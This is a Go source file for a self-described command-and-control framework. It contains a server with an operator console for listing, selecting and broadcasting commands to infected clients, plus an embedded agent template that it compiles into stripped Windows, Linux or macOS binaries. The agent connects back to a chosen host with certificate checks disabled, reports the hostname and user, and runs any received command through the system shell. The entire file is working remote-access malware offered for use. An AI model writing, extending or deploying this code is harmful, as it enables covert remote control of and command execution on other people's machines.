package server

import (
	"bufio"
	"c2-framework/internal/common"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

type Server struct {
	clients map[string]*common.Client
	mutex   sync.RWMutex
	port    string
	useTLS  bool
}

func NewServer(port string, useTLS bool) *Server {
	return &Server{
		clients: make(map[string]*common.Client),
		port:    port,
		useTLS:  useTLS,
	}
}

func (s *Server) Start() {
	if s.useTLS {
		s.startTLS()
	} else {
		s.startInsecure()
	}
}

func (s *Server) startTLS() {
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Println("Warning: Could not load TLS certificate, starting in insecure mode")
		s.startInsecure()
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	listener, err := tls.Listen("tcp", ":"+s.port, config)
	if err != nil {
		log.Fatalf("Failed to start TLS server: %v", err)
	}
	defer listener.Close()

	fmt.Printf("C2 Server started on port %s (TLS Encrypted)\n", s.port)
	s.startCLI()
	s.acceptConnections(listener)
}

func (s *Server) startInsecure() {
	listener, err := net.Listen("tcp", ":"+s.port)
	if err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
	defer listener.Close()

	fmt.Printf("C2 Server started on port %s (INSECURE - No Encryption)\n", s.port)
	s.startCLI()
	s.acceptConnections(listener)
}

func (s *Server) acceptConnections(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %v", err)
			continue
		}
		go s.handleClient(conn)
	}
}

func (s *Server) startCLI() {
	go func() {
		s.showBanner()
		scanner := bufio.NewScanner(os.Stdin)
		for {
			fmt.Print("C2> ")
			if !scanner.Scan() {
				break
			}
			input := strings.TrimSpace(scanner.Text())
			s.handleCommand(input)
		}
	}()
}

func (s *Server) showBanner() {
	fmt.Println("C2 Framework v1.0")
	fmt.Println("Command & Control")
	fmt.Println("Type 'help' for available commands")
	fmt.Println()
}

func (s *Server) handleCommand(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "help":
		s.showHelp()
	case "list", "clients":
		s.listClients()
	case "select":
		if len(parts) < 2 {
			fmt.Println("Usage: select <client_id>")
			return
		}
		s.selectClient(parts[1])
	case "broadcast", "all":
		if len(parts) < 2 {
			fmt.Println("Usage: broadcast <command>")
			return
		}
		command := strings.Join(parts[1:], " ")
		s.broadcastCommand(command)
	case "remove", "kick":
		if len(parts) < 2 {
			fmt.Println("Usage: remove <client_id>")
			return
		}
		s.removeClient(parts[1])
	case "generate", "gen":
		s.handleGenerateCommand(parts[1:])
	case "status":
		s.showStatus()
	case "clear":
		s.clearScreen()
	case "quit", "exit":
		fmt.Println("Shutting down C2 server...")
		os.Exit(0)
	default:
		fmt.Printf("Unknown command: %s. Type 'help' for available commands.\n", parts[0])
	}
}

func (s *Server) showHelp() {
	fmt.Println("Available Commands:")
	fmt.Println("  help                 - Show this help menu")
	fmt.Println("  list/clients         - List all connected clients")
	fmt.Println("  select <client_id>   - Interactive session with client")
	fmt.Println("  broadcast <command>  - Send command to all clients")
	fmt.Println("  remove <client_id>   - Disconnect a client")
	fmt.Println("  generate <options>   - Generate agent binary")
	fmt.Println("    gen windows        - Generate Windows agent")
	fmt.Println("    gen linux          - Generate Linux agent")
	fmt.Println("    gen macos          - Generate macOS agent")
	fmt.Println("    gen custom <host> <port> <os> <output>")
	fmt.Println("  status              - Show server status")
	fmt.Println("  clear               - Clear screen")
	fmt.Println("  quit/exit           - Shutdown server")
	fmt.Println()
}

func (s *Server) listClients() {
	s.mutex.RLock()
	defer s.mutex.RUnlock()

	if len(s.clients) == 0 {
		fmt.Println("No clients connected")
		return
	}

	fmt.Printf("Connected Clients (%d):\n", len(s.clients))
	for id, client := range s.clients {
		lastSeen := time.Since(client.LastSeen).Truncate(time.Second)
		fmt.Printf("ID: %-15s | OS/Arch: %-12s | Hostname: %-11s | User: %-12s | Last Seen: %s\n",
			s.truncate(id, 15),
			s.truncate(client.Info.OS+"/"+client.Info.Arch, 12),
			s.truncate(client.Info.Hostname, 11),
			s.truncate(client.Info.User, 12),
			lastSeen.String())
	}
}

func (s *Server) truncate(str string, length int) string {
	if len(str) <= length {
		return str
	}
	return str[:length-3] + "..."
}

func (s *Server) selectClient(clientID string) {
	s.mutex.RLock()
	client, exists := s.clients[clientID]
	s.mutex.RUnlock()

	if !exists {
		fmt.Printf("Client %s not found\n", clientID)
		return
	}

	fmt.Printf("Selected client: %s (%s)\n", clientID, client.Info.Hostname)
	fmt.Println("Type 'back' to return to main menu")

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("%s> ", s.truncate(clientID, 10))
		if !scanner.Scan() {
			break
		}
		command := strings.TrimSpace(scanner.Text())
		if command == "back" || command == "exit" {
			break
		}
		if command == "" {
			continue
		}

		s.sendCommand(client, command)
		time.Sleep(100 * time.Millisecond)
	}
}

func (s *Server) broadcastCommand(command string) {
	s.mutex.RLock()
	clientCount := len(s.clients)
	s.mutex.RUnlock()

	if clientCount == 0 {
		fmt.Println("No clients connected")
		return
	}

	fmt.Printf("Broadcasting to %d clients: %s\n", clientCount, command)

	s.mutex.RLock()
	for _, client := range s.clients {
		go s.sendCommand(client, command)
	}
	s.mutex.RUnlock()
}

func (s *Server) sendCommand(client *common.Client, command string) {
	msg := common.Message{
		Type:      "command",
		Command:   command,
		Timestamp: time.Now().Unix(),
	}

	data, _ := json.Marshal(msg)
	conn := client.Conn.(net.Conn)
	_, err := conn.Write(append(data, '\n'))
	if err != nil {
		log.Printf("Failed to send command to client %s: %v", client.ID, err)
		s.removeClientByID(client.ID)
	}
}

func (s *Server) handleClient(conn net.Conn) {
	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()

	decoder := json.NewDecoder(conn)
	var client *common.Client

	for {
		var msg common.Message
		if err := decoder.Decode(&msg); err != nil {
			if client != nil {
				s.removeClientByID(client.ID)
			}
			return
		}

		switch msg.Type {
		case "register":
			client = s.registerClient(conn, msg, remoteAddr)
		case "result":
			if client != nil {
				fmt.Printf("\n[%s] Result:\n%s\nC2> ", client.ID, msg.Result)
				client.LastSeen = time.Now()
			}
		case "heartbeat":
			if client != nil {
				client.LastSeen = time.Now()
			}
		}
	}
}

func (s *Server) registerClient(conn net.Conn, msg common.Message, remoteAddr string) *common.Client {
	var info common.ClientInfo
	json.Unmarshal([]byte(msg.Result), &info)
	info.IP = strings.Split(remoteAddr, ":")[0]

	clientID := msg.ClientID
	if clientID == "" {
		clientID = fmt.Sprintf("client_%d", time.Now().Unix())
	}

	client := &common.Client{
		ID:       clientID,
		Conn:     conn,
		LastSeen: time.Now(),
		Info:     info,
	}

	s.mutex.Lock()
	s.clients[clientID] = client
	s.mutex.Unlock()

	fmt.Printf("\nNew client connected: %s (%s@%s)\nC2> ",
		clientID, info.User, info.Hostname)
	return client
}

func (s *Server) removeClient(clientID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.removeClientByID(clientID)
}

func (s *Server) removeClientByID(clientID string) {
	if client, exists := s.clients[clientID]; exists {
		if conn, ok := client.Conn.(net.Conn); ok {
			conn.Close()
		}
		delete(s.clients, clientID)
		fmt.Printf("\nClient disconnected: %s\nC2> ", clientID)
	}
}

func (s *Server) showStatus() {
	s.mutex.RLock()
	defer s.mutex.RUnlock()

	fmt.Printf("Server Status:\n")
	fmt.Printf("  Port: %s\n", s.port)
	fmt.Printf("  TLS: %t\n", s.useTLS)
	fmt.Printf("  Connected Clients: %d\n", len(s.clients))
	fmt.Printf("  Uptime: %s\n", time.Since(time.Now()).String())
}

func (s *Server) clearScreen() {
	fmt.Print("\033[2J\033[H")
	s.showBanner()
}

func (s *Server) handleGenerateCommand(args []string) {
	if len(args) == 0 {
		fmt.Println("Usage: generate <platform> or generate custom <host> <port> <os> <output>")
		fmt.Println("Platforms: windows, linux, macos")
		return
	}

	switch args[0] {
	case "windows":
		s.generateAgent("localhost", s.port, "windows", "agent-windows.exe")
	case "linux":
		s.generateAgent("localhost", s.port, "linux", "agent-linux")
	case "macos":
		s.generateAgent("localhost", s.port, "darwin", "agent-macos")
	case "custom":
		if len(args) < 5 {
			fmt.Println("Usage: generate custom <host> <port> <os> <output>")
			fmt.Println("OS options: windows, linux, darwin")
			return
		}
		s.generateAgent(args[1], args[2], args[3], args[4])
	default:
		fmt.Println("Unknown platform. Use: windows, linux, macos, or custom")
	}
}

func (s *Server) generateAgent(host, port, targetOS, output string) {
	fmt.Printf("Generating agent for %s...\n", targetOS)

	agentSource := s.createAgentSource(host, port)
	tempFile := "temp_agent.go"
	if err := os.WriteFile(tempFile, []byte(agentSource), 0644); err != nil {
		fmt.Printf("Failed to create temp source: %v\n", err)
		return
	}
	defer os.Remove(tempFile)

	var cmd *exec.Cmd
	env := os.Environ()
	env = append(env, fmt.Sprintf("GOOS=%s", targetOS), "GOARCH=amd64")
	cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", output, tempFile)

	cmd.Env = env
	cmd.Dir = "."

	if output, err := cmd.CombinedOutput(); err != nil {
		fmt.Printf("Build failed: %v\n%s\n", err, string(output))
		return
	}

	info, err := os.Stat(output)
	if err != nil {
		fmt.Printf("Failed to get file info: %v\n", err)
		return
	}

	fmt.Printf("Agent generated successfully!\n")
	fmt.Printf("File: %s\n", output)
	fmt.Printf("Size: %.2f KB\n", float64(info.Size())/1024)
	fmt.Printf("Target: %s:%s (%s)\n", host, port, targetOS)
	fmt.Printf("Usage: ./%s (on target system)\n", output)
}

func (s *Server) createAgentSource(host, port string) string {
	return fmt.Sprintf(`package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	SERVER_HOST = "%s"
	SERVER_PORT = "%s"
	RECONNECT_INTERVAL = 10
)

type Message struct {
	Type      string `+"`json:\"type\"`"+`
	Command   string `+"`json:\"command\"`"+`
	Result    string `+"`json:\"result\"`"+`
	ClientID  string `+"`json:\"client_id\"`"+`
	Timestamp int64  `+"`json:\"timestamp\"`"+`
}

type ClientInfo struct {
	OS       string `+"`json:\"os\"`"+`
	Arch     string `+"`json:\"arch\"`"+`
	Hostname string `+"`json:\"hostname\"`"+`
	User     string `+"`json:\"user\"`"+`
	IP       string `+"`json:\"ip\"`"+`
}

func main() {
	clientID := generateClientID()
	
	for {
		if err := connectToServer(clientID); err != nil {
			time.Sleep(RECONNECT_INTERVAL * time.Second)
			continue
		}
		time.Sleep(RECONNECT_INTERVAL * time.Second)
	}
}

func generateClientID() string {
	hostname, _ := os.Hostname()
	return fmt.Sprintf("%%s_%%d", hostname, time.Now().Unix())
}

func connectToServer(clientID string) error {
	var conn net.Conn
	var err error
	
	conn, err = tls.Dial("tcp", SERVER_HOST+":"+SERVER_PORT, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		conn, err = net.Dial("tcp", SERVER_HOST+":"+SERVER_PORT)
		if err != nil {
			return err
		}
	}
	defer conn.Close()
	
	if err := register(conn, clientID); err != nil {
		return err
	}
	
	go heartbeat(conn, clientID)
	
	return handleCommands(conn, clientID)
}

func register(conn net.Conn, clientID string) error {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	
	info := ClientInfo{
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		User:     user,
	}
	
	infoData, _ := json.Marshal(info)
	msg := Message{
		Type:      "register",
		ClientID:  clientID,
		Result:    string(infoData),
		Timestamp: time.Now().Unix(),
	}
	
	data, _ := json.Marshal(msg)
	_, err := conn.Write(append(data, '\n'))
	return err
}

func heartbeat(conn net.Conn, clientID string) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		msg := Message{
			Type:      "heartbeat",
			ClientID:  clientID,
			Timestamp: time.Now().Unix(),
		}
		data, _ := json.Marshal(msg)
		if _, err := conn.Write(append(data, '\n')); err != nil {
			return
		}
	}
}

func handleCommands(conn net.Conn, clientID string) error {
	decoder := json.NewDecoder(conn)
	
	for {
		var msg Message
		if err := decoder.Decode(&msg); err != nil {
			return err
		}
		
		if msg.Type == "command" {
			result := executeCommand(msg.Command)
			sendResult(conn, clientID, result)
		}
	}
}

func executeCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "Empty command"
	}
	
	switch parts[0] {
	case "sysinfo":
		return getSystemInfo()
	case "pwd":
		dir, err := os.Getwd()
		if err != nil {
			return fmt.Sprintf("Error: %%v", err)
		}
		return fmt.Sprintf("Current directory: %%s", dir)
	case "whoami":
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		return fmt.Sprintf("Current user: %%s", user)
	default:
		return executeSystemCommand(command)
	}
}

func getSystemInfo() string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	
	return fmt.Sprintf("System Information:\nOS: %%s\nArch: %%s\nHostname: %%s\nUser: %%s\nGo: %%s",
		runtime.GOOS, runtime.GOARCH, hostname, user, runtime.Version())
}

func executeSystemCommand(command string) string {
	var cmd *exec.Cmd
	
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/C", command)
	default:
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %%v\nOutput: %%s", err, string(output))
	}
	return string(output)
}

func sendResult(conn net.Conn, clientID, result string) {
	msg := Message{
		Type:      "result",
		Result:    result,
		ClientID:  clientID,
		Timestamp: time.Now().Unix(),
	}
	
	data, _ := json.Marshal(msg)
	conn.Write(append(data, '\n'))
}
`, host, port)
}
